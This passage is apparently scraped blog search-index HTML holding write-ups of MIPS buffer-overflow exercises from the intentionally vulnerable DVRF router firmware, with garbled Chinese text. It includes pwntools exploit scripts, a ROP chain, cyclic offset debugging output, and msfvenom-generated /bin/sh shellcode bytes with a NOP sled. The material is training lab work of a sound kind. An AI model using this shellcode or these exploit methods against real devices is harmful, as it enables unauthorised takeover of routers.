payload+=b&amp;quot;aaaa&amp;quot; # $s0
payload+=p32(gadget2) # $s1-&amp;gt;gadget2
payload+=p32(sleep_func) # $s2-&amp;gt;sleep_func
payload+=b&amp;quot;aaaa&amp;quot; #padding
payload+=p32(gadget0) # $ra1-&amp;gt;gadget0


#stack for gadget2
payload+=b&amp;quot;a&amp;quot;*0x1c #padding
payload+=p32(gadget4) # $s0-&amp;gt;gadget
payload+=b&amp;quot;aaaa&amp;quot;*2 #padding
payload+=p32(gadget3) # $ra2-&amp;gt;gadget3

# gadget1-&amp;gt;gadget0-&amp;gt;gadget2-&amp;gt;sleep(1)-&amp;gt;gadget3-&amp;gt;gadget4

#stack for shellcode
payload+=b&amp;quot;a&amp;quot;*0x18
payload+=shellcode

io.recvuntil(b&amp;quot;Send Me Bytes:&amp;quot;)

io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">DVRF socket_bof</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/oIVkgnDGh/"" data-c="
          &lt;p&gt;‰∏éstack_bof_01Á±ª‰ººÔºå‰∏çËøáÂ∞ë‰∫ÜÂêéÈó®ÂáΩÊï∞ÔºåmipsÊû∂ÊûÑÂÖ≥Èó≠NX‰øùÊä§ÔºåÊâÄ‰ª•Ê≠§È¢òÊâìshellcodeÂç≥ÂèØÔºåÂèØ‰ª•ÊèêÂâçË∞ÉËØïÂá∫ËøîÂõûÁöÑÊ†à‰∏äÂú∞ÂùÄÁÑ∂ÂêéÈÉ®ÁΩ≤shellcodeÔºåÊúÄÂêéË¶ÜÁõñ&lt;code&gt;$ra&lt;/code&gt;‰∏∫ËØ•Âú∞ÂùÄÂç≥ÂèØ&lt;br&gt;
ÈÉ®ÁΩ≤shellcodeÊó∂ÂèØ‰ª•Âú®shellcodeÂâçÈù¢Âä†‰∏änop sledÂ¢ûÂº∫Ê≥õÁî®ÊÄß&lt;br&gt;
jeb2‰∏äÈù¢ÁªôÁöÑnop sledÊòØËøô‰∏™&lt;br&gt;
&lt;code&gt;# NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes): &amp;quot;\x26\x40\x08\x01&amp;quot;&lt;/code&gt;&lt;br&gt;
&lt;code&gt;$t0&lt;/code&gt;Â±û‰∫é‰∏¥Êó∂ÂØÑÂ≠òÂô®ÔºånopÁöÑÂéüÂàôÊòØÂØπÂêéÁª≠ÊâßË°åshellcode‰∏çÂΩ±ÂìçÔºåÂ¶ÇÊûúÁî®msfvenomÁîüÊàêshellcodeÂèØ‰ª•Ëµå‰∏ÄÊâã&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

payload=cyclic(0x300)

with open(&amp;quot;payload&amp;quot;,&amp;quot;w&amp;quot;) as f:
    f.write(payload.decode())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰ΩøÁî®‰∏äÈù¢ËÑöÊú¨ÁîüÊàêpadding&lt;br&gt;
‰ΩøÁî®bashËÑöÊú¨ÂêØÂä®&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#! /bin/bash
cp $(which qemu-mipsel-static) ./q
./q  -L ./ -g 1234  ./stack_bof_02 &amp;quot;`cat payload`&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;gdb-multiarchËøûÊé•‰∏ä‰πãÂêéÊµãÁÆóÂÅèÁßªÈáè&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;*PC   0x66616163 (&#39;caaf&#39;)
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ DISASM / mips / set emulate on ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Invalid address 0x66616163










‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ STACK ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
00:0000‚îÇ fp sp 0x407ffd08 ‚óÇ‚Äî 0x66616164 (&#39;daaf&#39;)
01:0004‚îÇ       0x407ffd0c ‚óÇ‚Äî 0x66616165 (&#39;eaaf&#39;)
02:0008‚îÇ       0x407ffd10 ‚óÇ‚Äî 0x66616166 (&#39;faaf&#39;)
03:000c‚îÇ       0x407ffd14 ‚óÇ‚Äî 0x66616167 (&#39;gaaf&#39;)
04:0010‚îÇ       0x407ffd18 ‚óÇ‚Äî 0x66616168 (&#39;haaf&#39;)
05:0014‚îÇ       0x407ffd1c ‚óÇ‚Äî 0x66616169 (&#39;iaaf&#39;)
06:0018‚îÇ       0x407ffd20 ‚óÇ‚Äî 0x6661616a (&#39;jaaf&#39;)
07:001c‚îÇ       0x407ffd24 ‚óÇ‚Äî 0x6661616b (&#39;kaaf&#39;)
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ BACKTRACE ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 ‚ñ∫ 0 0x66616163
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
pwndbg&amp;gt; cyclic -l 0x66616163
Finding cyclic pattern of 4 bytes: b&#39;caaf&#39; (hex: 0x63616166)
Found at offset 508
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•ÊµãÂá∫Êù•ÂÅèÁßª‰∏∫508&lt;br&gt;
ËøôÈÅìÈ¢òmsfvenomÁîüÊàêÁöÑshellcode‰∏çÂ§™Á®≥ÔºåÂèØ‰ª•Â§öÁîüÊàêÂá†Ê¨°ËØïËØïÔºå‰πüÂèØ‰ª•Áî®shell-strom‰∏äÊúâÁöÑ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;‚îå‚îÄ[fk@fk]‚îÄ[~]
‚îî‚îÄ‚îÄ‚ïº $msfvenom -p linux/mipsle/exec  CMD=/bin/sh  --arch mipsle --platform linux -f py --bad-chars &amp;quot;\x00&amp;quot;
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=51, char=0x00)
Attempting to encode payload with 1 iterations of mipsle/byte_xori
mipsle/byte_xori succeeded with size 156 (iteration=0)
mipsle/byte_xori chosen with final size 156
Payload size: 156 bytes
Final size of py file: 778 bytes
buf =  b&amp;quot;&amp;quot;
buf += b&amp;quot;\xc6\xff\x0e\x24\x27\x70\xc0\x01\xac\xff\x0b\x24&amp;quot;
buf += b&amp;quot;\xff\xff\x10\x05\xde\x86\x08\x28\x27\x58\x60\x01&amp;quot;
buf += b&amp;quot;\x21\xc8\xeb\x03\x21\x80\xeb\x03\xee\xa5\x17\x28&amp;quot;
buf += b&amp;quot;\xff\xff\x31\x83\xfc\xff\x0d\x24\x27\x30\xa0\x01&amp;quot;
buf += b&amp;quot;\xfe\xff\xcf\x20\xfc\xff\x28\x83\x21\xb8\xef\x02&amp;quot;
buf += b&amp;quot;\x12\x89\x03\x39\x2b\xf0\xee\x02\xfc\xff\x23\xa3&amp;quot;
buf += b&amp;quot;\xfa\xff\xc0\x17\x21\xc8\x2f\x03\xfc\xff\x04\x26&amp;quot;
buf += b&amp;quot;\xcb\xff\x0a\x24\x27\x28\x40\x01\x33\x10\x02\x24&amp;quot;
buf += b&amp;quot;\x0c\x54\x4a\x01\x12\x12\x12\x12\x74\x14\x14\x36&amp;quot;
buf += b&amp;quot;\xed\xed\xc2\x16\xed\xed\x14\x3a\xf2\xed\xaf\x35&amp;quot;
buf += b&amp;quot;\x13\x02\xf6\x35\x0d\xe2\x96\x36\xfa\xed\xb6\xbd&amp;quot;
buf += b&amp;quot;\xfe\xed\xb2\xbd\xfa\xed\xb7\x35\xb9\x1d\x10\x36&amp;quot;
buf += b&amp;quot;\x1e\x13\x13\x13\x3d\x70\x7b\x7c\x3d\x61\x7a\x12&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ê≥®ÊÑèexpÈáåÈù¢&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

# libc_addr=0x3fecd000

payload=b&amp;quot;&amp;quot;

# NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)
for i in range(30):
    payload += b&amp;quot;\x26\x40\x08\x01&amp;quot;

buf =  b&amp;quot;&amp;quot;
buf += b&amp;quot;\xc6\xff\x0e\x24\x27\x70\xc0\x01\xac\xff\x0b\x24&amp;quot;
buf += b&amp;quot;\xff\xff\x10\x05\xde\x86\x08\x28\x27\x58\x60\x01&amp;quot;
buf += b&amp;quot;\x21\xc8\xeb\x03\x21\x80\xeb\x03\xee\xa5\x17\x28&amp;quot;
buf += b&amp;quot;\xff\xff\x31\x83\xfc\xff\x0d\x24\x27\x30\xa0\x01&amp;quot;
buf += b&amp;quot;\xfe\xff\xcf\x20\xfc\xff\x28\x83\x21\xb8\xef\x02&amp;quot;
buf += b&amp;quot;\x12\x89\x03\x39\x2b\xf0\xee\x02\xfc\xff\x23\xa3&amp;quot;
buf += b&amp;quot;\xfa\xff\xc0\x17\x21\xc8\x2f\x03\xfc\xff\x04\x26&amp;quot;
buf += b&amp;quot;\xcb\xff\x0a\x24\x27\x28\x40\x01\x33\x10\x02\x24&amp;quot;
buf += b&amp;quot;\x0c\x54\x4a\x01\x12\x12\x12\x12\x74\x14\x14\x36&amp;quot;
buf += b&amp;quot;\xed\xed\xc2\x16\xed\xed\x14\x3a\xf2\xed\xaf\x35&amp;quot;
buf += b&amp;quot;\x13\x02\xf6\x35\x0d\xe2\x96\x36\xfa\xed\xb6\xbd&amp;quot;
buf += b&amp;quot;\xfe\xed\xb2\xbd\xfa\xed\xb7\x35\xb9\x1d\x10\x36&amp;quot;
buf += b&amp;quot;\x1e\x13\x13\x13\x3d\x70\x7b\x7c\x3d\x61\x7a\x12&amp;quot;


payload +=buf
stack_addr=0x407ffc08
payload+=b&amp;quot;a&amp;quot;*(508-len(payload))+p32(stack_addr)

with open(&amp;quot;payload&amp;quot;,&amp;quot;w&amp;quot;) as f:
	f.write(payload)
# io=process(b&amp;quot;./q  -L ./ -g 1234 ./stack_bof_01 &amp;quot;.decode()+payload,shell=True)

# io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1692632215340.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">DVRF stack_bof_02</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/9lLK_Patw/"" data-c="
          &lt;p&gt;&lt;code&gt;binwalk -Me&lt;/code&gt;ÊèêÂèñÂõ∫‰ª∂Âêé&lt;br&gt;
‰ΩøÁî®idaÊü•ÁúãÔºåÂèëÁé∞Á®ãÂ∫è‰ªéÂëΩ‰ª§Ë°åÂèÇÊï∞‰∏≠‰º†ÈÄí&lt;code&gt;strcpy&lt;/code&gt;ÁöÑÊï∞ÊçÆ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[200]; // [sp+18h] [+18h] BYREF

  if ( argc &amp;lt; 2 )
  {
    puts(&amp;quot;Usage: stack_bof_01 &amp;lt;argument&amp;gt;\r\n-By b1ack0wl\r&amp;quot;);
    exit(1);
  }
  puts(&amp;quot;Welcome to the first BoF exercise!\r\n\r&amp;quot;);
  strcpy(v4, argv[1]);
  printf(&amp;quot;You entered %s \r\n&amp;quot;, v4);
  return 65;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÈÄöËøá&lt;code&gt;cyclic&lt;/code&gt;ÁîüÊàê&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

payload=cyclic(0x300)

with open(&amp;quot;payload&amp;quot;,&amp;quot;w&amp;quot;) as f:
    f.write(payload.decode())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ËøôÈáåÊàë‰ª¨‰ΩøÁî®&lt;code&gt;qemu-user&lt;/code&gt;Êù•Ê®°ÊãüÔºåÂÜô‰∏Ä‰∏™bashËÑöÊú¨Â∏ÆÂä©Êàë‰ª¨ÂàùÂßãÂåñ&lt;br&gt;
ËÆ∞ÂæóÊääÊâÄÈúÄÁöÑÈìæÊé•Â∫ìÁõÆÂΩïÂ§çÂà∂Âà∞Á®ãÂ∫èÊâÄÂú®ÁõÆÂΩï‰∏ã&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#! /bin/bash
cp $(which qemu-mipsel-static) ./q
./q  -L ./ -g 1234 ./stack_bof_01 &amp;quot;`cat payload`&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÁÑ∂Âêé‰ΩøÁî®&lt;code&gt;gdb-multiarch&lt;/code&gt;Ôºå‰ΩøÁî®&lt;code&gt;set arch mips&lt;/code&gt;ÊåáÂÆöÊû∂ÊûÑÔºå&lt;code&gt;target remote:1234&lt;/code&gt;ÂºÄÂêØËøúÁ®ãË∞ÉËØïÔºåÊ†πÊçÆ&lt;code&gt;cyclic -l&lt;/code&gt;ÂèØ‰ª•ÁÆóÂá∫ÂÅèÁßª&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;*GP   0x448b80
*FP   0x407fffc8 ‚óÇ‚Äî 0x63616163 (&#39;caac&#39;)
*SP   0x407fffc8 ‚óÇ‚Äî 0x63616163 (&#39;caac&#39;)
*PC   0x63616162 (&#39;baac&#39;)
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ DISASM ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Invalid address 0x63616162






‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ STACK ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
00:0000‚îÇ fp sp 0x407fffc8 ‚óÇ‚Äî 0x63616163 (&#39;caac&#39;)
01:0004‚îÇ       0x407fffcc ‚óÇ‚Äî 0x63616164 (&#39;daac&#39;)
02:0008‚îÇ       0x407fffd0 ‚óÇ‚Äî 0x63616165 (&#39;eaac&#39;)
03:000c‚îÇ       0x407fffd4 ‚óÇ‚Äî 0x63616166 (&#39;faac&#39;)
04:0010‚îÇ       0x407fffd8 ‚óÇ‚Äî 0x63616167 (&#39;gaac&#39;)
05:0014‚îÇ       0x407fffdc ‚óÇ‚Äî 0x63616168 (&#39;haac&#39;)
06:0018‚îÇ       0x407fffe0 ‚óÇ‚Äî 0x63616169 (&#39;iaac&#39;)
07:001c‚îÇ       0x407fffe4 ‚óÇ‚Äî 0x6361616a (&#39;jaac&#39;)
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ BACKTRACE ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 ‚ñ∫ f 0 0x63616162
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
pwndbg&amp;gt; cyclic -l 0x63616162
204
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Â∞ùËØïÊåâÁÖßx86ÁöÑÊÄùË∑ØÁõ¥Êé•Ë¶ÜÁõñ&lt;code&gt;$ra&lt;/code&gt;ÔºåËøôÈáå‰ΩøÁî®bytesÂ≠òÂú®null bytesËØª‰∏çËøõÂéªÔºåÊúÄÂêéÁî®ÁöÑstr&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

payload=&#39;a&#39;*204+&#39;\xe0\x08\x40&#39;

io=process(b&amp;quot;./q  -L ./ -g 1234 ./stack_bof_01 &amp;quot;.decode()+payload,shell=True)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊúÄÂêéÂºÇÂ∏∏&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;*S8   0x61616161 (&#39;aaaa&#39;)
*GP   0x448b80
 FP   0x0
*SP   0x40800038 ‚óÇ‚Äî 0
*PC   0x407ff2a9 ‚óÇ‚Äî beqz   $v0, 0x4081f27d /* 0x10407ff4 */
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ DISASM ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 ‚ñ∫ 0x407ff2a9    beqz   $v0, 0x4081f27d
 
   0x407ff2ad    swr    $ra, -0xf($at)
   0x407ff2b1    ll     $zero, 0x7ff4($v0)



